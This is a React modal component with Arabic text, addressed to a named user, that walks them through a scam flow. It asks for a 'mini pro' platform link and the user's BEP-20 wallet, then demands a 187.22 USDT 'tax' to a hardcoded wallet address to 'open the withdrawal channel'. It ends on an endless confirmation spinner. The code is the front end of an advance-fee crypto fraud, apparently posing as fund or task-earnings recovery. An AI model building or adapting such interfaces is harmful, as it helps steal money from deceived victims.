
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2 } from 'lucide-react';

type ModalStep = 1 | 2 | 3 | 4;

const TaskModal: React.FC = () => {
  const [step, setStep] = useState<ModalStep>(1);
  const [copied, setCopied] = useState(false);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const targetAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const handleCopy = () => {
    navigator.clipboard.writeText(targetAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const nextStep = () => {
    setStep((prev) => (prev + 1) as ModalStep);
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6">
      {/* Blurry Backdrop - Reduced blur intensity from md to sm */}
      <div className="absolute inset-0 bg-black/30 backdrop-blur-[3px]" />

      {/* Modal Container */}
      <div className="relative w-full max-w-sm bg-white rounded-3xl shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-8 flex flex-col items-center text-center">
          
          {step === 1 && (
            <div className="space-y-6 w-full">
              <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2 mx-auto">
                <CheckCircle2 className="text-blue-500" size={32} />
              </div>
              <h2 className="text-xl font-bold text-gray-800 leading-relaxed" dir="rtl">
                أهلاً بك Basil3216260
              </h2>
              <p className="text-gray-600 leading-relaxed" dir="rtl">
                تم حل أمر المهام. اضغط التالي وقم بوضع رابط المنصة <span className="font-bold text-blue-600">mini pro</span> لقسم الإيداع حصراً.
              </p>
              <input 
                type="text"
                placeholder="رابط المنصة"
                className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-right"
                dir="rtl"
                value={platformLink}
                onChange={(e) => setPlatformLink(e.target.value)}
              />
              <button 
                onClick={nextStep}
                className="w-full bg-[#3a82f6] text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 active:scale-95 transition-transform"
              >
                التالي
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-6 w-full">
              <h2 className="text-xl font-bold text-gray-800" dir="rtl">
                رابط المحفظة
              </h2>
              <p className="text-gray-600" dir="rtl">
                يرجى وضع رابط محفظة BEP-20 الخاصة بك:
              </p>
              <input 
                type="text"
                placeholder="رابط محفظة BEP-20"
                className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-right"
                dir="rtl"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
              />
              <button 
                onClick={nextStep}
                className="w-full bg-[#3a82f6] text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 active:scale-95 transition-transform"
              >
                التالي
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-5 w-full">
              <h2 className="text-xl font-bold text-gray-800" dir="rtl">
                اهلا بك Basil3216260
              </h2>
              <div className="bg-amber-50 p-4 rounded-xl border border-amber-100 text-sm text-amber-800 leading-relaxed" dir="rtl">
                بقي أمر إيداع مبلغ <span className="font-bold">187.22 USDT (BEP-20)</span> لفتح قناة السحب. 
                هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
              </div>
              
              <div className="w-full space-y-2">
                <p className="text-xs text-gray-400 font-medium text-right">عنوان المحفظة للتحويل:</p>
                <div className="flex items-center gap-2 bg-gray-50 p-3 rounded-xl border border-dashed border-gray-300">
                  <button onClick={handleCopy} className="p-2 bg-white rounded-lg shadow-sm active:bg-gray-100">
                    {copied ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} className="text-gray-500" />}
                  </button>
                  <span className="text-[10px] font-mono break-all text-gray-600 select-all">{targetAddress}</span>
                </div>
              </div>

              <button 
                onClick={nextStep}
                className="w-full bg-[#50cf96] text-white font-bold py-4 rounded-xl shadow-lg shadow-green-100 active:scale-95 transition-transform"
              >
                تم الإيداع
              </button>
            </div>
          )}

          {step === 4 && (
            <div className="space-y-6 py-4 flex flex-col items-center">
              <Loader2 className="text-blue-500 animate-spin" size={48} />
              <p className="text-lg font-medium text-gray-700" dir="rtl">
                الرجاء الانتظار للتأكد من عملية الإيداع...
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TaskModal;
